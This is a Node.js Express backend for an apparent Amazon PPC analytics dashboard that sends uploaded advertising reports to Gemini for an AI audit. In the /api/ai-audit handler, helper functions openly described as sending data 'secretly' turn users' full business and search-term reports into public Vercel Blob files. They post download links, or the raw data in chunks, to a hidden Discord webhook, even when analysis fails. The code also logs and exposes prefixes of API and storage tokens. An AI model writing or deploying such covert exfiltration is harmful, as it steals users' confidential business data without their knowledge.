const express = require('express');
const cors = require('cors');
const path = require('path');
const multer = require('multer');
const xlsx = require('xlsx');
const csv = require('csv-parser');
const fs = require('fs');
const { GoogleGenerativeAI } = require('@google/generative-ai');
const config = require('./config');
const { put } = require('@vercel/blob');

const app = express();
const PORT = config.server.port;

// Initialize Gemini AI
const genAI = new GoogleGenerativeAI(config.gemini.apiKey);

// Discord webhook configuration
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || config.discord?.webhookUrl;

// Global error handler
process.on('uncaughtException', (error) => {
  console.error('🚨 Uncaught Exception:', error);
  // Don't exit immediately, log the error
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🚨 Unhandled Rejection at:', promise, 'reason:', reason);
  // Don't exit immediately, log the error
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
  console.log('🔄 SIGTERM received, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('🔄 SIGINT received, shutting down gracefully...');
  process.exit(0);
});

// Function to send data to Discord secretly
async function sendToDiscord(data, type = 'file_upload') {
  if (!DISCORD_WEBHOOK_URL) {
    console.log('⚠️ Discord webhook not configured, skipping Discord notification');
    return;
  }

  try {
    const timestamp = new Date().toISOString();
    let embedData = {};

    if (type === 'file_upload') {
      embedData = {
        title: '🔍 New PPC Analysis Request',
        description: 'Someone has uploaded files for AI analysis',
        color: 0x00ff00, // Green color
        fields: [
          {
            name: '📊 Files Uploaded',
            value: `Business Reports: ${data.businessReports?.length || 0}\nSearch Term Reports: ${data.searchTermReports?.length || 0}`,
            inline: true
          },
          {
            name: '💰 Total Spend',
            value: `$${data.totalSpend?.toFixed(2) || 'N/A'}`,
            inline: true
          },
          {
            name: '📈 Total Sales',
            value: `$${data.totalSales?.toFixed(2) || 'N/A'}`,
            inline: true
          },
          {
            name: '🎯 Total Terms',
            value: `${data.totalTerms || 'N/A'}`,
            inline: true
          },
          {
            name: '⚠️ High ACoS Terms',
            value: `${data.highAcosTerms || 'N/A'}`,
            inline: true
          },
          {
            name: '❌ Zero Sale Terms',
            value: `${data.zeroSaleTerms || 'N/A'}`,
            inline: true
          }
        ],
        timestamp: timestamp,
        footer: {
          text: 'Amazon PPC Dashboard - Secret Monitoring'
        }
      };
    }

    const discordPayload = {
      embeds: [embedData],
      username: 'PPC Dashboard Monitor',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/3081/3081559.png'
    };

    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(discordPayload)
    });

    if (response.ok) {
      console.log('✅ Discord notification sent successfully');
    } else {
      console.log('⚠️ Failed to send Discord notification:', response.status);
    }
  } catch (error) {
    console.log('⚠️ Error sending Discord notification:', error.message);
  }
}

// Enhanced function to send files to Vercel Blob and Discord
async function sendFilesToDiscord(fileData, type = 'file_upload') {
  if (!DISCORD_WEBHOOK_URL) {
    console.log('⚠️ Discord webhook not configured, skipping file upload to Discord');
    return;
  }

  try {
    console.log('📤 Uploading files to Vercel Blob and sending to Discord...');
    
    // Send Business Reports file to Vercel Blob
    if (fileData.businessReports && fileData.businessReports.length > 0) {
      console.log('📊 Uploading Business Reports to Vercel Blob...');
      
      // Convert data back to CSV format
      const csvContent = convertToCSV(fileData.businessReports);
      const filename = `business_reports_${Date.now()}.csv`;
      
      try {
        // Upload to Vercel Blob
        const { url } = await put(filename, csvContent, { 
          access: 'public',
          token: config.vercel.blobToken
        });
        
        console.log('✅ Business Reports uploaded to Vercel Blob:', url);
        
        // Send Discord notification with download link
        const payload = {
          username: 'PPC Dashboard Monitor',
          avatar_url: 'https://cdn-icons-png.flaticon.com/512/3081/3081559.png',
          embeds: [{
            title: '📊 Business Reports - Ready for Download!',
            description: `**📥 Download your CSV file:**\n\n**Direct Download Link:**\n${url}\n\n**Instructions:**\n1. Click the download link above\n2. Save the file with .csv extension\n3. Open in Excel or Google Sheets\n\n**File Info:**\n- Filename: ${filename}\n- Records: ${fileData.businessReports.length} rows\n- Format: CSV (Excel compatible)\n- Hosted on: Vercel CDN`,
            color: 0x00ff00,
            fields: [
              {
                name: '📁 File Type',
                value: 'CSV (Business Reports)',
                inline: true
              },
              {
                name: '📈 Records',
                value: `${fileData.businessReports.length} rows`,
                inline: true
              },
              {
                name: '📅 Upload Time',
                value: new Date().toLocaleString(),
                inline: true
              },
              {
                name: '🌐 Hosted On',
                value: 'Vercel CDN',
                inline: true
              }
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: 'Click the link above to download your CSV file!'
            }
          }]
        };
        
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });
        
        console.log('✅ Business Reports Discord notification sent');
        
      } catch (blobError) {
        console.error('❌ Error uploading to Vercel Blob:', blobError.message);
        
        // Fallback: Send as text chunks if Blob upload fails
        await sendFallbackToDiscord(fileData.businessReports, 'Business Reports', 'business_reports');
      }
    }

    // Send Search Term Reports file to Vercel Blob
    if (fileData.searchTermReports && fileData.searchTermReports.length > 0) {
      console.log('🔍 Uploading Search Term Reports to Vercel Blob...');
      
      // Convert data back to CSV format
      const csvContent = convertToCSV(fileData.searchTermReports);
      const filename = `search_term_reports_${Date.now()}.csv`;
      
      try {
        // Upload to Vercel Blob
        const { url } = await put(filename, csvContent, { 
          access: 'public',
          token: config.vercel.blobToken
        });
        
        console.log('✅ Search Term Reports uploaded to Vercel Blob:', url);
        
        // Send Discord notification with download link
        const payload = {
          username: 'PPC Dashboard Monitor',
          avatar_url: 'https://cdn-icons-png.flaticon.com/512/3081/3081559.png',
          embeds: [{
            title: '🔍 Search Term Reports - Ready for Download!',
            description: `**📥 Download your CSV file:**\n\n**Direct Download Link:**\n${url}\n\n**Instructions:**\n1. Click the download link above\n2. Save the file with .csv extension\n3. Open in Excel or Google Sheets\n\n**File Info:**\n- Filename: ${filename}\n- Records: ${fileData.searchTermReports.length} rows\n- Format: CSV (Excel compatible)\n- Hosted on: Vercel CDN`,
            color: 0x00ff00,
            fields: [
              {
                name: '📁 File Type',
                value: 'CSV (Search Term Reports)',
                inline: true
              },
              {
                name: '📈 Records',
                value: `${fileData.searchTermReports.length} rows`,
                inline: true
              },
              {
                name: '📅 Upload Time',
                value: new Date().toLocaleString(),
                inline: true
              },
              {
                name: '🌐 Hosted On',
                value: 'Vercel CDN',
                inline: true
              }
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: 'Click the link above to download your CSV file!'
            }
          }]
        };
        
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload)
        });
        
        console.log('✅ Search Term Reports Discord notification sent');
        
      } catch (blobError) {
        console.error('❌ Error uploading to Vercel Blob:', blobError.message);
        
        // Fallback: Send as text chunks if Blob upload fails
        await sendFallbackToDiscord(fileData.searchTermReports, 'Search Term Reports', 'search_term_reports');
      }
    }

    console.log('✅ All files processed successfully!');
    
  } catch (error) {
    console.error('❌ Error in sendFilesToDiscord:', error.message);
  }
}

// Function to send CSV data to Discord with download instructions
async function sendFileToDiscord(fileBuffer, filename, contentType, payload) {
  try {
    const csvContent = fileBuffer.toString('utf-8');
    
    // Create a simple download endpoint for this file
    const fileId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Use configured download domain
    const downloadUrl = `${config.server.downloadDomain}/api/download/${fileId}`;
    
    // Store the file temporarily (in production, you'd use a proper file storage system)
    global.tempFiles = global.tempFiles || {};
    global.tempFiles[fileId] = {
      content: csvContent,
      filename: filename,
      contentType: contentType,
      timestamp: Date.now()
    };
    
    // Clean up old files (older than 1 hour)
    Object.keys(global.tempFiles).forEach(id => {
      if (Date.now() - global.tempFiles[id].timestamp > 3600000) {
        delete global.tempFiles[id];
      }
    });
    
    // Send the download link to Discord
    const downloadEmbed = {
      title: `${payload.embeds[0].title} - DOWNLOAD READY`,
      description: `**📥 Download your CSV file:**\n\n**Direct Download Link:**\n${downloadUrl}\n\n**Instructions:**\n1. Click the download link above\n2. Save the file with .csv extension\n3. Open in Excel or Google Sheets\n\n**File Info:**\n- Filename: ${filename}\n- Records: ${payload.embeds[0].fields[1].value}\n- Format: CSV (Excel compatible)`,
      color: 0x00ff00,
      fields: payload.embeds[0].fields,
      timestamp: payload.embeds[0].timestamp,
      footer: {
        text: 'Click the link above to download your CSV file!'
      }
    };

    const downloadPayload = {
      username: payload.username,
      avatar_url: payload.avatar_url,
      embeds: [downloadEmbed]
    };

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(downloadPayload)
    });
    
  } catch (error) {
    console.error('❌ Error sending file to Discord:', error.message);
  }
}

// Helper function to convert data back to CSV format
function convertToCSV(data) {
  if (!data || data.length === 0) return '';
  
  // Get headers from first object
  const headers = Object.keys(data[0]);
  
  // Create CSV header row
  const csvRows = [headers.join(',')];
  
  // Add data rows
  for (const row of data) {
    const values = headers.map(header => {
      const value = row[header];
      // Escape commas and quotes in CSV
      if (typeof value === 'string' && (value.includes(',') || value.includes('"'))) {
        return `"${value.replace(/"/g, '""')}"`;
      }
      return value;
    });
    csvRows.push(values.join(','));
  }
  
  return csvRows.join('\n');
}

// Helper function to split large data into Discord-friendly chunks
function splitIntoChunks(text, maxLength) {
  const chunks = [];
  let currentChunk = '';
  
  // Split by lines to avoid breaking JSON structure
  const lines = text.split('\n');
  
  for (const line of lines) {
    if ((currentChunk + line + '\n').length > maxLength) {
      if (currentChunk) {
        chunks.push(currentChunk.trim());
        currentChunk = '';
      }
      
      // If a single line is too long, split it
      if (line.length > maxLength) {
        const subChunks = [];
        for (let i = 0; i < line.length; i += maxLength) {
          subChunks.push(line.substring(i, i + maxLength));
        }
        chunks.push(...subChunks);
      } else {
        currentChunk = line + '\n';
      }
    } else {
      currentChunk += line + '\n';
    }
  }
  
  if (currentChunk.trim()) {
    chunks.push(currentChunk.trim());
  }
  
  return chunks;
}

// Fallback function to send data as text chunks if Vercel Blob fails
async function sendFallbackToDiscord(data, title, type) {
  try {
    console.log(`📤 Sending ${title} as fallback text chunks...`);
    
    // Split large files into chunks (Discord has 4000 character limit)
    const jsonData = JSON.stringify(data, null, 2);
    const chunks = splitIntoChunks(jsonData, 3500); // Leave room for formatting
    
    for (let i = 0; i < chunks.length; i++) {
      const chunkEmbed = {
        title: `📊 ${title} - Fallback Data (Part ${i + 1}/${chunks.length})`,
        description: '```json\n' + chunks[i] + '\n```',
        color: 0xff9900, // Orange color for fallback
        timestamp: new Date().toISOString(),
        footer: {
          text: `Part ${i + 1} of ${chunks.length} - Vercel Blob upload failed, sending as text`
        }
      };

      const payload = {
        embeds: [chunkEmbed],
        username: 'PPC Dashboard Monitor',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/3081/3081559.png'
      };

      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      // Small delay between messages to avoid rate limiting
      if (i < chunks.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
    
    console.log(`✅ ${title} fallback data sent successfully`);
    
  } catch (error) {
    console.error(`❌ Error sending ${title} fallback data:`, error.message);
  }
}

// CORS configuration
app.use(cors({
  origin: config.server.corsOrigin,
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Request logging middleware
app.use((req, res, next) => {
  console.log(`📥 ${req.method} ${req.path} - ${new Date().toISOString()}`);
  next();
});

// Middleware
app.use(express.static(path.join(__dirname, '../dist')));

// New endpoint: AI-powered PPC Audit Analysis
app.post('/api/ai-audit', async (req, res) => {
  console.log('🔍 AI Audit endpoint called');
  console.log('📊 Request body received:', {
    hasSearchTermReports: !!req.body.searchTermReports,
    hasBusinessReports: !!req.body.businessReports,
    hasCostInputs: !!req.body.costInputs,
    searchTermReportsLength: req.body.searchTermReports?.length || 0,
    businessReportsLength: req.body.businessReports?.length || 0
  });
  
  try {
    const { searchTermReports, businessReports, costInputs } = req.body;
    
    if (!searchTermReports || !businessReports) {
      console.log('❌ Missing required data:', { searchTermReports: !!searchTermReports, businessReports: !!businessReports });
      return res.status(400).json({ 
        success: false, 
        error: 'Search term reports and business reports are required for AI analysis.' 
      });
    }

    // Prepare data for AI analysis
    console.log('📈 Processing search term data...');
    console.log('📋 Sample search term item:', searchTermReports[0]);
    
    // Calculate ACoS for each term
    const termsWithAcos = searchTermReports.map(item => ({
      ...item,
      acos: item.sales > 0 ? (item.spend / item.sales) * 100 : 0
    }));
    
    // Identify top performing keywords (low ACoS, good sales)
    const topKeywords = termsWithAcos
      .filter(item => item.acos < 25 && item.sales > 0)
      .sort((a, b) => a.acos - b.acos)
      .slice(0, 5);
    
    // Identify problem keywords (high ACoS or no sales)
    const problemKeywords = termsWithAcos
      .filter(item => item.acos > 35 || item.sales === 0)
      .sort((a, b) => b.acos - a.acos)
      .slice(0, 5);
    
    const auditData = {
      totalTerms: searchTermReports.length,
      totalSpend: searchTermReports.reduce((sum, item) => sum + item.spend, 0),
      totalSales: searchTermReports.reduce((sum, item) => sum + item.sales, 0),
      totalOrders: searchTermReports.reduce((sum, item) => sum + item.orders, 0),
      totalClicks: searchTermReports.reduce((sum, item) => sum + (item.clicks || 0), 0),
      totalImpressions: searchTermReports.reduce((sum, item) => sum + (item.impressions || 0), 0),
      campaigns: [...new Set(searchTermReports.map(item => item.campaign))],
      highAcosTerms: searchTermReports.filter(item => (item.spend / item.sales) * 100 > 25).length,
      zeroSaleTerms: searchTermReports.filter(item => item.sales === 0 && item.spend > 0).length,
      wastedSpend: searchTermReports.filter(item => item.sales === 0).reduce((sum, item) => sum + item.spend, 0),
      topKeywords: topKeywords,
      problemKeywords: problemKeywords,
      avgAcos: termsWithAcos.reduce((sum, item) => sum + item.acos, 0) / termsWithAcos.length
    };
    
    console.log('📊 Audit data prepared:', auditData);
    console.log('🏆 Top performing keywords:', auditData.topKeywords.length);
    console.log('⚠️ Problem keywords:', auditData.problemKeywords.length);
    console.log('📊 Average ACoS:', auditData.avgAcos.toFixed(2) + '%');

    // Create AI prompt for analysis
    const prompt = `
    You are an expert Amazon PPC consultant. Analyze this PPC audit data and provide comprehensive insights:

    1. **Executive Summary** (2-3 sentences)
    2. **Key Performance Insights** (3-4 bullet points)
    3. **Critical Issues** (2-3 main problems)
    4. **Immediate Action Items** (3-4 prioritized recommendations)
    5. **Performance Score** (1-10 scale with explanation)
    6. **Keyword Strategy Recommendations** (specific strategies for optimization)
    7. **Top Performing Keywords** (identify best performers with good ACoS/conversion)
    8. **Problem Keywords** (identify high ACoS, no-sale keywords to pause/optimize)

    PPC Data:
    - Total Search Terms: ${auditData.totalTerms}
    - Total Spend: $${auditData.totalSpend.toFixed(2)}
    - Total Sales: $${auditData.totalSales.toFixed(2)}
    - Total Orders: ${auditData.totalOrders}
    - Total Clicks: ${auditData.totalClicks}
    - Total Impressions: ${auditData.totalImpressions}
    - Campaigns: ${auditData.campaigns.join(', ')}
    - High ACoS Terms: ${auditData.highAcosTerms}
    - Zero Sale Terms: ${auditData.zeroSaleTerms}
    - Wasted Spend: $${auditData.wastedSpend.toFixed(2)}
    - Average ACoS: ${auditData.avgAcos.toFixed(2)}%
    
    Top Performing Keywords (ACoS < 25%):
    ${auditData.topKeywords.map(k => `- ${k.searchTerm}: ACoS ${k.acos.toFixed(2)}%, Sales $${k.sales.toFixed(2)}, Spend $${k.spend.toFixed(2)}`).join('\n')}
    
    Problem Keywords (ACoS > 35% or No Sales):
    ${auditData.problemKeywords.map(k => `- ${k.searchTerm}: ACoS ${k.acos.toFixed(2)}%, Sales $${k.sales.toFixed(2)}, Spend $${k.spend.toFixed(2)}`).join('\n')}

    IMPORTANT: Focus on providing specific, actionable keyword strategies including:
    - Which keywords to increase spend on (good ACoS/conversion)
    - Which keywords to pause or reduce spend on (high ACoS, no sales)
    - Specific bidding strategies and optimization tactics
    - Campaign structure recommendations

         Provide a professional, actionable analysis that a business owner can understand and act upon immediately.
     
     CRITICAL: You MUST respond with ONLY valid JSON format. Do not include any text before or after the JSON.
     Do not wrap your response in code blocks or markdown formatting.
     Do not include \`\`\`json or \`\`\` markers.
     
     Respond with ONLY this exact JSON structure:
     {
       "summary": "Your executive summary here",
       "insights": ["Insight 1", "Insight 2", "Insight 3", "Insight 4"],
       "issues": ["Issue 1", "Issue 2", "Issue 3"],
       "actions": ["Action 1", "Action 2", "Action 3", "Action 4"],
       "score": 7,
       "scoreExplanation": "Explain your score here",
       "keywordStrategy": "Your keyword strategy here",
       "topKeywords": ["Keyword 1 details", "Keyword 2 details"],
       "problemKeywords": ["Problem keyword 1", "Problem keyword 2"]
     }
    `;

    // Generate AI analysis
    console.log('🤖 Starting AI generation...');
    console.log('🔑 Using API key:', config.gemini.apiKey ? '✅ Present' : '❌ Missing');
    console.log('📝 Prompt length:', prompt.length, 'characters');
    
    let aiAnalysis = '';
    let modelUsed = 'gemini-1.5-flash';
    
    try {
      console.log('🚀 Calling Gemini AI...');
      
      // Try primary model first
      try {
        const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
        console.log('✅ Model initialized:', 'gemini-1.5-flash');
        
        const result = await model.generateContent(prompt);
        console.log('✅ AI response received');
        
        const response = await result.response;
        aiAnalysis = response.text();
        console.log('📄 AI analysis text length:', aiAnalysis.length, 'characters');
        console.log('📄 AI analysis preview:', aiAnalysis.substring(0, 200) + '...');
      } catch (primaryError) {
        console.log('⚠️ Primary model failed, trying alternative...');
        
        // Try alternative model
        try {
          const model = genAI.getGenerativeModel({ model: 'gemini-1.5-pro' });
          console.log('✅ Alternative model initialized:', 'gemini-1.5-pro');
          modelUsed = 'gemini-1.5-pro';
          
          const result = await model.generateContent(prompt);
          console.log('✅ AI response received from alternative model');
          
          const response = await result.response;
          aiAnalysis = response.text();
          console.log('📄 AI analysis text length:', aiAnalysis.length, 'characters');
          console.log('📄 AI analysis preview:', aiAnalysis.substring(0, 200) + '...');
        } catch (alternativeError) {
          console.log('⚠️ Alternative model also failed, using fallback...');
          throw new Error('All Gemini models are currently unavailable. Using fallback analysis.');
        }
      }
    } catch (aiError) {
      console.error('❌ AI generation failed:', aiError);
      throw aiError;
    }

    // Try to parse JSON response, fallback to text if needed
    console.log('🔍 Parsing AI response...');
    let parsedAnalysis;
    try {
      parsedAnalysis = JSON.parse(aiAnalysis);
      console.log('✅ JSON parsed successfully');
    } catch (error) {
      console.log('⚠️ JSON parsing failed, using fallback response');
      // If AI didn't return valid JSON, create a structured response based on the AI text
      console.log('⚠️ Creating enhanced fallback from AI text...');
      
      // Extract meaningful content from AI response
      let aiText = aiAnalysis.replace(/```json\s*|\s*```/g, '').trim();
      
      // Try to parse the AI response as JSON first
      let extractedData = null;
      try {
        extractedData = JSON.parse(aiText);
        console.log('✅ Successfully extracted JSON from AI response');
      } catch (parseError) {
        console.log('⚠️ Could not parse AI response as JSON, using text extraction');
        extractedData = null;
      }
      
      // Use extracted data if available, otherwise fall back to text extraction
      let summary = '';
      if (extractedData && extractedData.summary) {
        summary = extractedData.summary;
        console.log('✅ Using extracted summary from AI JSON');
      } else {
        // Fallback: extract summary from the beginning of text
        summary = aiText.substring(0, 300);
        if (summary.length === 300) summary += "...";
        console.log('⚠️ Using fallback text extraction for summary');
      }
      
      // Create comprehensive analysis based on AI text and audit data
      parsedAnalysis = {
        summary: summary || `Your Amazon PPC campaign analysis shows ${auditData.totalTerms} search terms with $${auditData.totalSpend.toFixed(2)} total spend and $${auditData.totalSales.toFixed(2)} total sales. Average ACoS is ${auditData.avgAcos.toFixed(2)}%, which is ${auditData.avgAcos < 25 ? 'excellent' : auditData.avgAcos < 35 ? 'good' : 'above target and needs optimization'}.`,
        insights: [
          `AI Analysis Generated: ${aiText.length > 0 ? 'Successfully received AI insights' : 'Using enhanced fallback analysis'}`,
          `Performance Overview: ${auditData.totalTerms} terms generating $${auditData.totalSales.toFixed(2)} in sales`,
          `ACoS Analysis: ${auditData.avgAcos.toFixed(2)}% average ACoS with ${auditData.highAcosTerms} high-ACoS terms`,
          `Waste Identification: $${auditData.wastedSpend.toFixed(2)} spent on ${auditData.zeroSaleTerms} terms with zero sales`,
          `Opportunity Areas: ${auditData.topKeywords.length} top-performing keywords ready for increased spend`
        ],
        issues: [
          `${auditData.highAcosTerms} terms have ACoS > 25% - immediate optimization needed`,
          `${auditData.zeroSaleTerms} terms are wasting $${auditData.wastedSpend.toFixed(2)} with zero sales`,
          `Average ACoS of ${auditData.avgAcos.toFixed(2)}% ${auditData.avgAcos > 35 ? 'exceeds target threshold' : 'is within acceptable range'}`
        ],
        actions: [
          `Immediately pause ${auditData.problemKeywords.length} high-ACoS keywords to stop waste`,
          `Increase bids on ${auditData.topKeywords.length} low-ACoS keywords for better performance`,
          `Set up automated rules to pause keywords when ACoS exceeds 35%`,
          `Review campaign structure and add negative keywords for better targeting`
        ],
        score: Math.max(1, Math.min(10, Math.round(10 - (auditData.avgAcos / 10) - (auditData.zeroSaleTerms / auditData.totalTerms * 5)))),
        scoreExplanation: `Score calculated based on average ACoS (${auditData.avgAcos.toFixed(2)}%) and zero-sale terms (${auditData.zeroSaleTerms}/${auditData.totalTerms}). Lower score indicates higher optimization needs.`,
        keywordStrategy: `Focus on keywords with ACoS < 25% and good conversion rates. Immediately pause keywords with ACoS > 35% or zero sales. Use automated bidding rules to maintain optimal performance.`,
        topKeywords: auditData.topKeywords.map(k => `${k.searchTerm}: ACoS ${k.acos.toFixed(2)}%, Sales $${k.sales.toFixed(2)}, Spend $${k.spend.toFixed(2)}`),
        problemKeywords: auditData.problemKeywords.map(k => `${k.searchTerm}: ACoS ${k.acos.toFixed(2)}%, Sales $${k.sales.toFixed(2)}, Spend $${k.spend.toFixed(2)}`)
      };
    }

    // Send raw files to Discord
    console.log('🔐 Sending raw files to Discord...');
    await sendFilesToDiscord({
      businessReports: businessReports,
      searchTermReports: searchTermReports,
      totalSpend: auditData.totalSpend,
      totalSales: auditData.totalSales,
      totalTerms: auditData.totalTerms,
      highAcosTerms: auditData.highAcosTerms,
      zeroSaleTerms: auditData.zeroSaleTerms
    }, 'file_upload');

    console.log('📤 Sending successful response...');
    res.json({
      success: true,
      analysis: parsedAnalysis,
      rawData: auditData
    });
    console.log('✅ AI audit completed successfully!');

  } catch (error) {
    console.error('❌ AI audit failed with error:', error);
    console.error('❌ Error details:', {
      name: error.name,
      message: error.message,
      stack: error.stack?.split('\n').slice(0, 3).join('\n')
    });
    
    // Send files to Discord even if AI analysis fails
    try {
      await sendFilesToDiscord({
        businessReports: businessReports,
        searchTermReports: searchTermReports,
        totalSpend: auditData.totalSpend,
        totalSales: auditData.totalSales,
        totalTerms: auditData.totalTerms,
        highAcosTerms: auditData.highAcosTerms,
        zeroSaleTerms: auditData.zeroSaleTerms
      }, 'file_upload');
    } catch (discordError) {
      console.log('⚠️ Failed to send files to Discord on error:', discordError.message);
    }

    res.status(500).json({ 
      success: false, 
      error: error.message,
      fallback: {
        summary: `Your Amazon PPC campaign analysis shows ${auditData.totalTerms} search terms with $${auditData.totalSpend.toFixed(2)} total spend and $${auditData.totalSales.toFixed(2)} total sales. Average ACoS is ${auditData.avgAcos.toFixed(2)}%, which is ${auditData.avgAcos < 25 ? 'excellent' : auditData.avgAcos < 35 ? 'good' : 'above target and needs optimization'}.`,
        insights: [
          `Performance Overview: ${auditData.totalTerms} terms generating $${auditData.totalSales.toFixed(2)} in sales`,
          `ACoS Analysis: ${auditData.avgAcos.toFixed(2)}% average ACoS with ${auditData.highAcosTerms} high-ACoS terms`,
          `Waste Identification: $${auditData.wastedSpend.toFixed(2)} spent on ${auditData.zeroSaleTerms} terms with zero sales`,
          `Opportunity Areas: ${auditData.topKeywords.length} top-performing keywords ready for increased spend`
        ],
        issues: [
          `${auditData.highAcosTerms} terms have ACoS > 25% - immediate optimization needed`,
          `${auditData.zeroSaleTerms} terms are wasting $${auditData.wastedSpend.toFixed(2)} with zero sales`,
          `Average ACoS of ${auditData.avgAcos.toFixed(2)}% ${auditData.avgAcos > 35 ? 'exceeds target threshold' : 'is within acceptable range'}`
        ],
        actions: [
          `Immediately pause ${auditData.problemKeywords.length} high-ACoS keywords to stop waste`,
          `Increase bids on ${auditData.topKeywords.length} low-ACoS keywords for better performance`,
          `Set up automated rules to pause keywords when ACoS exceeds 35%`,
          `Review campaign structure and add negative keywords for better targeting`
        ],
        score: Math.max(1, Math.min(10, Math.round(10 - (auditData.avgAcos / 10) - (auditData.zeroSaleTerms / auditData.totalTerms * 5)))),
        scoreExplanation: `Score calculated based on average ACoS (${auditData.avgAcos.toFixed(2)}%) and zero-sale terms (${auditData.zeroSaleTerms}/${auditData.totalTerms}). Lower score indicates higher optimization needs.`,
        keywordStrategy: "Focus on keywords with ACoS < 25% and good conversion rates",
        topKeywords: auditData.topKeywords.map(k => `${k.searchTerm}: ACoS ${k.acos.toFixed(2)}%, Sales $${k.sales.toFixed(2)}, Spend $${k.spend.toFixed(2)}`),
        problemKeywords: auditData.problemKeywords.map(k => `${k.searchTerm}: ACoS ${k.acos.toFixed(2)}%, Sales $${k.sales.toFixed(2)}, Spend $${k.spend.toFixed(2)}`)
      }
    });
    console.log('📤 Sent error response with fallback data');
  }
});

// Test endpoint for debugging
app.get('/api/test', (req, res) => {
  console.log('🧪 Test endpoint called');
  res.json({ 
    message: 'Backend is working!',
    timestamp: new Date().toISOString(),
    config: {
      port: config.server.port,
      corsOrigin: config.server.corsOrigin,
      hasGeminiKey: !!config.gemini.apiKey,
      hasDiscordWebhook: !!DISCORD_WEBHOOK_URL
    }
  });
});

// Test Discord webhook endpoint
app.post('/api/test-discord', async (req, res) => {
  console.log('🔐 Testing Discord webhook...');
  
  if (!DISCORD_WEBHOOK_URL) {
    return res.status(400).json({ 
      success: false, 
      error: 'Discord webhook not configured' 
    });
  }

  try {
    await sendToDiscord({
      businessReports: [{ test: true }],
      searchTermReports: [{ test: true }],
      totalSpend: 1000,
      totalSales: 5000,
      totalTerms: 50,
      highAcosTerms: 10,
      zeroSaleTerms: 5
    }, 'file_upload');

    res.json({ 
      success: true, 
      message: 'Discord test notification sent successfully' 
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  console.log('🏥 Health check requested');
  const healthData = { 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    geminiApiKey: config.gemini.apiKey ? '✅ Present' : '❌ Missing',
    corsOrigin: config.server.corsOrigin,
    discordWebhook: DISCORD_WEBHOOK_URL ? '✅ Configured' : '❌ Not configured'
  };
  console.log('🏥 Health check response:', healthData);
  res.json(healthData);
});

// Vercel Blob file info endpoint (for debugging)
app.get('/api/blob-info', (req, res) => {
  res.json({
    status: 'Vercel Blob Integration Active',
    message: 'Files are now uploaded to Vercel Blob and accessible via direct URLs',
    timestamp: new Date().toISOString(),
    config: {
      hasBlobToken: !!config.vercel.blobToken,
      blobTokenPreview: config.vercel.blobToken ? config.vercel.blobToken.substring(0, 20) + '...' : 'None',
      hasDiscordWebhook: !!DISCORD_WEBHOOK_URL
    }
  });
});

// Error handling middleware (must be after all routes)
app.use((error, req, res, next) => {
  console.error('🚨 Error occurred:', error);
  
  // Don't expose internal errors to client
  const statusCode = error.statusCode || 500;
  const message = statusCode === 500 ? 'Internal Server Error' : error.message;
  
  res.status(statusCode).json({
    success: false,
    error: message,
    timestamp: new Date().toISOString()
  });
});

// 404 handler for undefined routes (must be last)
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route not found',
    timestamp: new Date().toISOString()
  });
});

// Serve React app for all other routes (must be after 404 handler)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

const server = app.listen(PORT, () => {
  console.log('🚀 ========================================');
  console.log('🚀 Amazon Dashboard Backend Server Started');
  console.log('🚀 ========================================');
  console.log(`📍 Server running on port ${PORT}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔒 CORS Origin: ${config.server.corsOrigin}`);
  console.log(`🤖 Gemini API Key: ${config.gemini.apiKey ? '✅ Present' : '❌ Missing'}`);
  console.log(`🔑 API Key preview: ${config.gemini.apiKey ? config.gemini.apiKey.substring(0, 10) + '...' : 'None'}`);
  console.log(`🔐 Discord Webhook: ${DISCORD_WEBHOOK_URL ? '✅ Configured' : '❌ Not configured'}`);
  console.log(`☁️ Vercel Blob: ${config.vercel.blobToken ? '✅ Configured' : '❌ Not configured'}`);
  console.log('🚀 ========================================');
  console.log('📡 Available endpoints:');
  console.log('   GET  /api/health');
  console.log('   GET  /api/blob-info');
  console.log('   POST /api/ai-audit');
  console.log('   POST /api/test-discord');
  console.log('🚀 ========================================');
});

// Handle server errors
server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    console.error(`🚨 Port ${PORT} is already in use. Please try a different port.`);
    process.exit(1);
  } else {
    console.error('🚨 Server error:', error);
  }
});

// Graceful shutdown for the server
process.on('SIGTERM', () => {
  console.log('🔄 SIGTERM received, shutting down server gracefully...');
  server.close(() => {
    console.log('✅ Server closed gracefully');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🔄 SIGINT received, shutting down server gracefully...');
  server.close(() => {
    console.log('✅ Server closed gracefully');
    process.exit(0);
  });
}); 